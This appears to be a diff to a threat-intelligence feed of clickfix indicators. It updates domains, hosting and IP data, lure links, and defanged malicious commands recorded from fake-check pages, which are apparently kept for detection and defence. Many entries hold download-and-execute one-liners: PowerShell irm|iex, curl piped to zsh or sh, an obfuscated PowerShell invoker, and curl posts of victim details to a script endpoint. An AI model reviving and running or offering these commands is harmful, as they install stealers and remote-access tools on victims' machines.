@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 6277,
+ "count": 6275,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -39169,6 +39169,52 @@
    ]
   },
   {
+   "indicator": "bancalosrebeldes.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-28",
+   "last_seen": "2026-11-28",
+   "last_online": "2026-11-28",
+   "offline_since": null,
+   "url": "https://bancalosrebeldes.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hetzner",
+   "dns": "freehosting.com",
+   "ip": "148.251.254.59",
+   "asn": "AS24940",
+   "org": "HETZNER-AS Hetzner Online GmbH, DE",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "148.251.254.59",
+     "asn": "AS24940",
+     "org": "HETZNER-AS Hetzner Online GmbH, DE",
+     "first_seen": "2026-11-28",
+     "last_seen": "2026-11-28"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "bancalosrebeldes.com",
+     "status": "online",
+     "first_seen": "2026-11-28",
+     "last_seen": "2026-11-28"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "IRM gitlab[.]com/roza-1984y/f040-4a05-a5c2-[id]/-/raw/main/8a64-[id] | IEXX"
+   ],
+   "connects_to": [],
+   "lure_from": []
+  },
+  {
    "indicator": "bancocedula-online.com",
    "type": "domain",
    "category": "clickfix",
@@ -50036,10 +50082,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'codes-veri[.]beer/[id]'|iex",
     "irm 'codes[.]browse-cdn[.]beer/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
+    "codes-veri.beer",
     "codes.browse-cdn.beer",
     "ncheck-brows.beer"
    ],
@@ -59105,10 +59153,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'codes-veri[.]beer/[id]'|iex",
     "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
    ],
    "connects_to": [
+    "codes-veri.beer",
     "t-trustrest.com",
     "xorados.com",
     "groverudder12.com"
@@ -69848,12 +69898,12 @@
    ],
    "lure_from": [
     "fudcomcheck.art",
+    "tthcsslread21.cc",
+    "tlschssl22read.cc",
     "fcdnbovres.cc",
     "govrobczxc.cc",
     "webrtwtre22.cc",
-    "webffoo002.cc",
-    "tthcsslread21.cc",
-    "tlschssl22read.cc"
+    "webffoo002.cc"
    ]
   },
   {
@@ -70250,22 +70300,22 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=d21a|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=d21a|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=2669|iex"
+    "irm hxxps[:]//tthcsslread21[.]cc/cdn/sync/traffic?r=9fd9|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//tthcsslread21[.]cc/cdn/sync/traffic?r=9fd9|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=d21a|iex"
    ],
    "connects_to": [
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "tthcsslread21.cc"
    ],
    "lure_from": [
     "ubbrobccheck20.cc",
     "fudcomcheck.art",
+    "tlschssl22read.cc",
     "fcdnbovres.cc",
     "govrobczxc.cc",
     "webrtwtre22.cc",
-    "webffoo002.cc",
-    "tthcsslread21.cc",
-    "tlschssl22read.cc"
+    "webffoo002.cc"
    ]
   },
   {
@@ -72386,16 +72436,16 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=7af6|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=7af6|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=d1b4|iex"
+    "irm hxxps[:]//fcdnbovres[.]cc/cdn/sync/traffic?r=64b8|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//fcdnbovres[.]cc/cdn/sync/traffic?r=64b8|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=7af6|iex"
    ],
    "connects_to": [
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "fcdnbovres.cc"
    ],
    "lure_from": [
     "fudcomcheck.art",
-    "fcdnbovres.cc",
     "ubbrobccheck20.cc",
     "govrobczxc.cc"
    ]
@@ -75206,12 +75256,12 @@
    ],
    "lure_from": [
     "fudcomcheck.art",
+    "tthcsslread21.cc",
+    "tlschssl22read.cc",
     "fcdnbovres.cc",
     "govrobczxc.cc",
     "webrtwtre22.cc",
-    "webffoo002.cc",
-    "tthcsslread21.cc",
-    "tlschssl22read.cc"
+    "webffoo002.cc"
    ]
   },
   {
@@ -75309,17 +75359,17 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6cc8|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6cc8|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=9e8f|iex"
+    "irm hxxps[:]//fcdnbovres[.]cc/cdn/sync/traffic?r=0fb4|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//fcdnbovres[.]cc/cdn/sync/traffic?r=0fb4|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6cc8|iex"
    ],
    "connects_to": [
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "fcdnbovres.cc"
    ],
    "lure_from": [
     "fudcomcheck.art",
     "ubbrobccheck20.cc",
-    "fcdnbovres.cc",
     "govrobczxc.cc"
    ]
   },
@@ -135910,11 +135960,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -141133,11 +141184,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "trustchecknes.com"
@@ -143204,11 +143256,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -145213,8 +145266,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=ca64f9e2-8ab9-4d17-914d-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fhempflowerplace.com%2F&os=Mac%2015&lastVisitAt=2026-11-22T22%3A17%3A24.455Z&lastShellAt=2026-11-22T22%3A17%3A24.455Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=003e9d02-c4e6-49ea-b253-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fhempflowerplace.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-22T22%3A14%3A31.359Z\"\" -d \"\"lastShellAt=2026-11-22T22%3A14%3A31.359Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=9aee902e-ec98-4b15-97a1-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fhempflowerplace.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-28T14%3A45%3A11.005Z\"\" -d \"\"lastShellAt=2026-11-28T14%3A45%3A11.005Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -fsSL hxxps[:]//script-six-tawny[.]vercel[.]app/win | cmd\"",
+    "curl -sL -d \"id=ca64f9e2-8ab9-4d17-914d-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fhempflowerplace.com%2F&os=Mac%2015&lastVisitAt=2026-11-22T22%3A17%3A24.455Z&lastShellAt=2026-11-22T22%3A17%3A24.455Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh"
    ],
    "connects_to": [
     "fingerprint-veri.info",
@@ -145225,7 +145278,8 @@
     "browse-nnccodes.beer",
     "browse-cloud.codes",
     "img-codes-cloude.info",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes-veri.beer"
    ]
   },
   {
@@ -148505,11 +148559,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
-    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "nexguard.pro",
     "t-trustresnew.com",
@@ -162639,11 +162694,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -172846,10 +172902,12 @@
    "actor_link": null,
    "commands": [
     "irm 'codes[.]browse-cdn[.]beer/[id]'|iex",
+    "irm 'codes-veri[.]beer/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
     "codes.browse-cdn.beer",
+    "codes-veri.beer",
     "ncheck-brows.beer"
    ],
    "lure_from": [
@@ -178242,11 +178300,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -231204,11 +231263,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -261035,6 +261095,46 @@
    ]
   },
   {
+   "indicator": "safepilot.io",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-28",
+   "last_seen": "2026-11-28",
+   "last_online": "2026-11-28",
+   "offline_since": null,
+   "url": "https://apcedificacion.safepilot.io/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": null,
+   "asn": null,
+   "org": null,
+   "country": null,
+   "ips": [],
+   "hosts": [
+    {
+     "host": "apcedificacion.safepilot.io",
+     "status": "online",
+     "first_seen": "2026-11-28",
+     "last_seen": "2026-11-28"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare[.]io/u)\""
+   ],
+   "connects_to": [
+    "cloudfiare.io"
+   ],
+   "lure_from": []
+  },
+  {
    "indicator": "safepilots2.wpenginepowered.com",
    "type": "domain",
    "category": "clickfix",
@@ -264437,14 +264537,14 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
+    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
    ],
    "connects_to": [
     "hagosuro.lc",
+    "lepafonso.bz",
     "holodeo.net",
-    "j7tracker.gb.net",
-    "lepafonso.bz"
+    "j7tracker.gb.net"
    ],
    "lure_from": [
     "interseq.at"
@@ -267459,58 +267559,6 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Grog1274/ec73471d-b7e6-4a5f-bcfd-[id]/7d4-8230-404f-9874-[id] | IEX"
    ],
    "connects_to": [],
-   "lure_from": []
-  },
-  {
-   "indicator": "seabulkint.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-23",
-   "last_seen": "2026-10-24",
-   "last_online": "2026-11-28",
-   "offline_since": null,
-   "url": "https://www.seabulkint.com/minerals/",
-   "brand": null,
-   "product": null,
-   "hosting": "DigitalOcean",
-   "dns": "GoDaddy",
-   "ip": "165.232.114.222",
-   "asn": "AS14061",
-   "org": "DIGITALOCEAN-ASN - DigitalOcean, LLC, US",
-   "country": "DE",
-   "ips": [
-    {
-     "ip": "165.232.114.222",
-     "asn": "AS14061",
-     "org": "DIGITALOCEAN-ASN - DigitalOcean, LLC, US",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-24"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.seabulkint.com",
-     "status": "online",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-24"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '6y07xqjs[.]elpaladin[.]net/?ublib=3b362d7e-0db0-4cb9-98e0-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-[id]/-/raw/main/01a1e287-8de7-700c-802a-[id] | IEX"
-   ],
-   "connects_to": [
-    "6y07xqjs.elpaladin.net",
-    "68m89kps.ebaz.store",
-    "l87fw2op.lochnesshunters.com"
-   ],
    "lure_from": []
   },
   {
@@ -286860,11 +286908,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//cfverification[.]com/Girya/[id]')|iex",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/Girya/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/Girya/[id]')|iex",
-    "(irm 'hxxps[:]//nexguard[.]pro/Girya/[id]')|iex"
+    "(irm 'hxxps[:]//github[.]pw/Girya/[id]')|iex"
    ],
    "connects_to": [
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -288642,11 +288691,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -306868,11 +306918,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -317363,57 +317414,6 @@
    "lure_from": []
   },
   {
-   "indicator": "umantia.es",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-21",
-   "last_seen": "2026-10-22",
-   "last_online": "2026-11-28",
-   "offline_since": null,
-   "url": "https://www.umantia.es/",
-   "brand": null,
-   "product": null,
-   "hosting": "Hetzner",
-   "dns": "servidoresadmin.com",
-   "ip": "167.235.169.209",
-   "asn": "AS24940",
-   "org": "HETZNER-AS Hetzner Online GmbH, DE",
-   "country": "DE",
-   "ips": [
-    {
-     "ip": "167.235.169.209",
-     "asn": "AS24940",
-     "org": "HETZNER-AS Hetzner Online GmbH, DE",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.umantia.es",
-     "status": "online",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/govnologi/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
-   ],
-   "connects_to": [
-    "t-trustrest.com"
-   ],
-   "lure_from": [
-    "interseq.at",
-    "sky.dolcefantasia.us"
-   ]
-  },
-  {
    "indicator": "umbrellaofhopeinc.com",
    "type": "domain",
    "category": "clickfix",
@@ -321974,11 +321974,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -323069,11 +323070,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -325017,11 +325019,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -325350,77 +325353,6 @@
     "oqaolhp0.bossbeyprime.click"
    ],
    "lure_from": []
-  },
-  {
-   "indicator": "virtualstaginglibrary.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-21",
-   "last_seen": "2026-10-22",
-   "last_online": "2026-11-28",
-   "offline_since": null,
-   "url": "https://virtualstaginglibrary.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "172.67.137.54",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "172.67.137.54",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    },
-    {
-     "ip": "104.21.94.146",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    },
-    {
-     "ip": "2606:4700:3030::6815:5e92",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-22",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "virtualstaginglibrary.com",
-     "status": "online",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
-   ],
-   "connects_to": [
-    "trek-72.com",
-    "t-trustrest.com",
-    "github.pw",
-    "nexguard.pro",
-    "t-trustresnew.com",
-    "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "virtuositytech.com",
@@ -326804,11 +326736,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -327604,11 +327537,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -328864,11 +328798,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -340480,11 +340415,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//cfverification[.]com/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "cfverification.com",
     "j7tracker.gb.net",
     "github.pw",
     "nexguard.pro",
@@ -341488,63 +341424,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "youcanfreeusuk.org",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-21",
-   "last_seen": "2026-10-22",
-   "last_online": "2026-11-28",
-   "offline_since": null,
-   "url": "https://youcanfreeusuk.org/",
-   "brand": null,
-   "product": null,
-   "hosting": "Namecheap",
-   "dns": "Namecheap",
-   "ip": "63.250.43.136",
-   "asn": "AS22612",
-   "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "63.250.43.136",
